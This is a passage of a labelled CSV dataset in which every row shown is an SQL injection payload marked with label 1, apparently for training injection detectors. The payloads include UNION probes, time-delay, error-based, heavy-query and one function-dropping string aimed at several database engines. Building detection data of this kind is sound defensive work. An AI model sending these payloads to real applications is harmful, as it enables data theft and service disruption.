,Sentence,Label
10861,"1"" )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
10862,-1192 order by 1#,1
10863,"1"" )  and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
10864,"-9661""  )  )   )  union all select 2158,2158,2158--",1
10865,"1%' )  union all select null,null,null,null,null,null,null,null,null,null--",1
10866,"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and  ( ""ihqf"" = ""ihqf",1
10867,"1'  )  )   )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( 'sdnc' = 'sdnc",1
10868,"1"" and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
10869,begin if  ( 5624 = 5624 )  then dbms_lock.sleep ( 5 ) ,1
10870,"1 )  where 2044 = 2044 or elt ( 6272 = 6272,sleep ( 5  )  )  --",1
10871,1 )  where 4573 = 4573,1
10872,"1%' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
10873,-8074' )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( 'lnwm' = 'lnwm,1
10874,"-6123"" or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and ""zuzx"" = ""zuzx",1
10875,"1"" where 2204 = 2204 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1
10876,1' )  as pogx where 4105 = 4105 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,1
10877,"-1949 )  as smyn where 4066 = 4066 union all select 4066,4066--",1
10878,"1"" where 9083 = 9083 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1
10879,"-7831""  )  )   as krzi where 3798 = 3798 order by 1--",1
10880,"-4522"" )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( ""mbkq"" = ""mbkq",1
10881,"-2028'  )  )   )  union all select 8698,8698,8698,8698#",1
10882,"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and ""pmpk"" like ""pmpk",1
10883,"1"" )  where 4660 = 4660 or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
10884,"1 where 6077 = 6077 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
10885,"1 or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ",1
10886,"1 union all select null,null,null,null,null--",1
10887,"-3852' )  union all select 3577,3577,3577,3577,3577,3577,3577,3577#",1
10888,"1'  )  )   as jxvv where 6593 = 6593 or elt ( 6272 = 6272,sleep ( 5  )  )  --",1
10889,"1 )  where 5232 = 5232 union all select null,null,null#",1
10890,"-8943%' )  union all select 7710,7710#",1
10891,"1%' union all select null,null,null,null,null--",1
10892,"-5744 )  union all select 3617,3617,3617,3617,3617,3617--",1
10893,"1, ( case when 8260 = 8260 then 1 else null end ) ",1
10894,1' )  or sleep ( 5 ) #,1
10895,"1"" )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( ""tzog"" like ""tzog",1
10896,"-5996 )  or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ",1
10897,1'|| ( select 'mlwj' from dual where 4247 = 4247 and 1702 = 8469 ) ||',1
10898,"-4054"" or 2824 = 4788--",1
10899,"1'  )  )   )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and   (  (   ( 'zxrb' = 'zxrb",1
10900," ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ",1
10901,"1""  )  )   as vigs where 6175 = 6175 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1
10902,1'+ ( select 'dpun' where 4760 = 4760,1
10903,"1' )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) ",1
10904,1'+ ( select tart where 9861 = 9861,1
10905,-9555'  )  )   )  or  ( 8459 = 8459 ) *4906 and   (  (   ( 'rwpq' like 'rwpq,1
10906,"1"" )  as pydh where 3407 = 3407 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
10907,"1"" where 1831 = 1831 and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #",1
10908,1  )  )   as goar where 2405 = 2405 and 5927 = 9731--,1
10909,"1'+ ( select ounb where 4653 = 4653 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   ) +'",1
10910,"-9772' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and 'igaa' = 'igaa",1
10911,"-2116%'  )  )   )  union all select 7119,7119,7119,7119,7119--",1
10912,1 )  where 7729 = 7729,1
10913,"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and  ( 8126 = 8126",1
10914,"1  )  )   as zdbj where 2300 = 2300  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) --",1
10915,1'+ ( select uhsy where 4596 = 4596 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno  )  )  +',1
10916,"1""  )  )   as ogzn where 6849 = 6849 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
10917,-5580 or 4829 = 1968,1
10918,"1 )  where 8630 = 8630 union all select null,null--",1
10919,"1' in boolean mode )  union all select null,null,null,null,null,null--",1
10920,1 )  as qkkm where 8461 = 8461,1
10921,"1""  )  )   or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  ""vypw"" like ""vypw",1
10922,"-5386' )  union all select 8026,8026,8026,8026,8026,8026#",1
10923,1'|| ( select 'dajl' from dual where 8440 = 8440,1
10924,1'  )  )   and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  'mmow' = 'mmow,1
10925,"1"" union all select null,null,null,null#",1
10926,1'  )  )   as cjjm where 1981 = 1981,1
10927,"1"" )  where 3507 = 3507",1
10928,1' or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and 'hokd' = 'hokd,1
10929,"1' )  or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
10930,1' )  where 3861 = 3861,1
10931,"1"" )  and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
10932,"1""  )  )   rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (  ""grct"" = ""grct",1
10933,"-2417 )  union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",1
10934,"-6368' union all select 6529,6529,6529--",1
10935,-3378'  )  )   or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (  'otbq' = 'otbq,1
10936,"1 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) ",1
10937,"1%""  )  )   and 4595 = 4595#",1
10938,"1%"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and ""%"" = """,1
10939,-3450' where 4478 = 4478 or 9323 = 9323#,1
10940,"-6478""  )  )   union all select 7087,7087,7087,7087,7087,7087,7087,7087--",1
10941,"1  )  )   and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
10942,"-3725'  )  )   union all select 1541,1541,1541,1541,1541#",1
10943,"1%"" and 5411 = 7697 and ""%"" = """,1
10944,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and '%' = '",1
10945,"-2059%"" or elt ( 4587 = 3101,3101 )  and ""%"" = """,1
10946,"1"" )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( ""vnso"" like ""vnso",1
10947,"1"" rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and ""cxsu"" like ""cxsu",1
10948,"-5158'  )  )   or make_set ( 9354 = 9354,7185 )  and   (  (  'noaj' like 'noaj",1
10949,"1%"" )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
10950,"1""  )  )   )  and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
10951,"-6733' )  where 4024 = 4024 union all select 4024,4024,4024,4024#",1
10952,1  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (  7805 = 7805,1
10953,select  ( case when  ( 7980 = 3703 )  then 7980 else 7980* ( select 7980 from information_schema.character_sets )  end ) #,1
10954,1' where 2911 = 2911,1
10955,"1'  )  )   as namw where 1740 = 1740 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) --",1
10956,-4684 )  as uqjn where 4550 = 4550 or 1689 = 5825,1
10957,"1  )  )   or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  4090 = 4090",1
10958,"1'|| ( select 'dbxr' where 4014 = 4014 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
10959,"-4947' in boolean mode )  union all select 3314,3314#",1
10960,"-7101  )  )   )  union all select 4587,4587,4587,4587,4587,4587--",1
10961,1'+ ( select 'sfko' where 6853 = 6853 rlike sleep ( 5 ) #,1
10962,1'|| ( select 'xqqp' where 3007 = 3007 and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
10963,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( ""jcyh"" = ""jcyh",1
10964,"-5300' union all select 2750,2750,2750,2750,2750,2750--",1
10965,"1%'  )  )   )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (   ( '%' = '",1
10966,"-5218 )  union all select 9677,9677#",1
10967,1%' rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and '%' = ',1
10968,1%'  )  )   )  and 7219 = 7361 and   (  (   ( '%' = ',1
10969,"-2916""  )  )   or 4946 = 8232--",1
10970,"1'+ ( select 'sppw' where 1677 = 1677 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   ) +'",1
10971,-6712'  )  )   as kqff where 9146 = 9146 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
10972,"-7812' )  or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( 'ttvo' = 'ttvo",1
10973,"1' in boolean mode )  union all select null,null,null--",1
10974,-7279 )  or 9898 = 9963 and  ( 1481 = 1481,1
10975,-8523 )  as hzqs where 8944 = 8944 order by 1--,1
10976,"1 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) -- wynp",1
10977,"1"" )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( ""mmgx"" like ""mmgx",1
10978,"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (  ""zzmn"" = ""zzmn",1
10979,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and ""%"" = """,1
10980,"1"" )  where 9570 = 9570 rlike  ( select  ( case when  ( 1642 = 3686 )  then 1 else 0x28 end  )  )  --",1
10981,"-6789'|| ( select 'uckz' from dual where 2163 = 2163 union all select 2163,2163,2163,2163,2163,2163--",1
10982,"1""  )  )   )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( ""urgd"" = ""urgd",1
10983,1' )  as mwpp where 6192 = 6192,1
10984,1' in boolean mode )  rlike sleep ( 5 ) #,1
10985,"1' )  where 7658 = 7658 union all select null,null#",1
10986,"-8988""  )  )   or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  ""dyxh"" like ""dyxh",1
10987,"-7065'+ ( select 'bdxr' where 1756 = 1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",1
10988,"1' and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and 'cdgm' like 'cdgm",1
10989,"-8588' union all select 2135,2135--",1
10990,if ( 1928 = 4811 )  select 1928 else drop function ucko--,1
10991,1' )  as pudv where 2609 = 2609,1
10992,"-8698"" where 1990 = 1990 or  ( 8459 = 8459 ) *4906--",1
10993,"1%' and elt ( 7619 = 1489,1489 )  and '%' = '",1
10994,"1'|| ( select 'epjr' from dual where 3074 = 3074 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
10995,1'+ ( select zpdf where 2938 = 2938,1
10996,"1"" where 3247 = 3247 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
10997,select  ( case when  ( 5796 = 8326 )  then 5796 else 5796* ( select 5796 from information_schema.character_sets )  end ) #,1
10998,"-5478"" )  where 4100 = 4100 or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
10999,1'+ ( select gthp where 7311 = 7311 or sleep ( 5 ) #,1
11000,"1""  )  )   or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
11001,"-3278'  )  )   or elt ( 1032 = 1032,3623 )  and   (  (  'zxig' like 'zxig",1
11002,"1"" )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and  ( ""vudj"" like ""vudj",1
11003,"1"" or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
11004,"1""  )  )   as dksq where 7161 = 7161",1
11005,"-6279' )  union all select 3026,3026,3026,3026,3026,3026,3026,3026--",1
11006,"-9566%"" )  union all select 7973,7973,7973,7973--",1
11007,"1  )  )   and elt ( 9288 = 6067,6067 )  and   (  (  1895 = 1895",1
11008,"1'  )  )   and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (  'ayqn' like 'ayqn",1
11009,"1'|| ( select 'xpjg' where 3036 = 3036 and elt ( 1832 = 6644,6644  )  )  ||'",1
11010,"1  )  )   as debc where 7428 = 7428 union all select null,null,null#",1
11011,"1 and make_set ( 8403 = 8403,8899 ) ",1
11012,"1' in boolean mode )  and elt ( 1210 = 1210,sleep ( 5  )  )  #",1
11013,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) # cdjm",1
11014,select pg_sleep ( 5 )  and 'zfyy' = 'zfyy,1
11015,"-2549' )  as zfnf where 1993 = 1993 union all select 1993,1993,1993,1993,1993,1993--",1
11016,1 and 9412 = 6877#,1
11017,"-4541""  )  )   or make_set ( 4821 = 5233,5233 )  and   (  (  ""xfex"" = ""xfex",1
11018,"1%'  )  )   )  union all select null,null,null,null,null,null#",1
11019,"1""  )  )   or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  ""vhey"" = ""vhey",1
11020,1 )  and 8417 = 5276#,1
11021,"-2140  )  )   union all select 8174,8174,8174#",1
11022,"1%"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and ""%"" = """,1
11023,"-2167'  )  )   )  union all select 3804,3804,3804,3804,3804,3804#",1
11024,"1'  )  )   as dtwh where 9633 = 9633 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
11025,1 )  as rlft where 1670 = 1670 waitfor delay '0:0:5'--,1
11026,"1"" )  as jaxh where 6318 = 6318 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  --",1
11027,"-6406%' )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( '%' = '",1
11028,-9311  )  )   or  ( 5065 = 2572 ) *2572 and   (  (  1199 = 1199,1
11029,"1"" )  as tnux where 4888 = 4888 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #",1
11030,"1'  )  )   and elt ( 6847 = 5874,5874 )  and   (  (  'yspu' = 'yspu",1
11031,"-7746' )  union all select 1998,1998,1998,1998,1998,1998,1998,1998#",1
11032,"1"" where 2677 = 2677 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) --",1
11033,"1%""",1
11034,"1'|| ( select 'odud' from dual where 2468 = 2468 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
11035, end and   (  (  '%' = ',1
11036,"1'+ ( select kpso where 1226 = 1226 union all select null,null,null,null,null,null,null,null--",1
11037,"1"" )  as lvbm where 8179 = 8179",1
11038,-7231  )  )   union all select 7639#,1
11039,"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  -- rlas",1
11040,1'+ ( select 'gtqr' where 5660 = 5660,1
11041,"1%""  )  )   and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
11042,"1"" where 9618 = 9618 and  ( 3020 = 3020 ) *6703--",1
11043,"1'  )  )   as kdwc where 5906 = 5906 union all select null,null,null,null,null,null,null,null,null--",1
11044,"1""  )  )   )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( ""ruvo"" like ""ruvo",1
